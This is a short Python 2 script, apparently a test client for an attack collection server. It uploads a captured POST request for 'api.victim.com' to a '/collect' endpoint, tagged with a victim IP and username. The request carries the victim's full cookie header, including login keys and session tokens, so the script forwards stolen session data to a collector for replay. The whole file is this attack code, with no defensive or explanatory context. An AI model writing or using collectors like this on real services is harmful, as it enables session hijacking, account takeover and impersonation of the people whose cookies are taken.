import MultipartPostHandler
import urllib2

url = 'http://127.0.0.1:8080/collect?ip=192.168.229.138&username=whogoes'

request="""{'body': 'friend=wonderful%20day!%20happy%20hou&Time=1368673209341&countType=&viewModel=&attips=&pic=&apiType=14&pgv_ref=web.base.master.talkBox.btnApolloMyHome&syncV=0&syncVVSign=0', 'headers': {'Origin': 'http://api.victim.com', 'Content-Length': '203', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4', 'Proxy-Connection': 'keep-alive', 'Rf': 'http://t.victim.com/doss', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1478.0 Safari/537.36', 'Host': 'api.victim.com', 'Referer': 'http://api.victim.com/proxy.html', 'Cookie': 'pvid=3274132956; pgv_r_cookie=1271790088720; SHKL_DIANXIN_121214_VV_HP_R0100_5=1@UV; speedup=sdch; mb_reg_from=8; wbilang_10000=zh_CN; _isp=ctc; _ui_loginid=noruser; _2ggid=onoruser; id=onoruser; key=289oJmSMz2HmA; RK=ClR39X7qyU; lid=onoruser; longkey=000100006f880c0218c62170418a5d162849ade3812b31c097b9552ad29c9cf242fec3dca2532e4d687ef9f5; wb_regf=%3B0%3B%3Bui._login2.victim.com%3B0; wbilang_noruser=zh_CN; ts_refer=ui.victim.com/cgi-bin/login; ts_last=/dosses; pgv_pvid=315273792; o_cookie=noruser; pgv_info=ssid=s7165179536; ts_uid=2984039004; ts_sid=1178844281', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip,deflate,sdch'}, 'uri': 'http://api.victim.com/old/friend.php?r=0.11201&_from=friend', 'method': 'POST'}"""

params = {'request': request}
opener = urllib2.build_opener(MultipartPostHandler.MultipartPostHandler)
print opener.open(url, params).read()





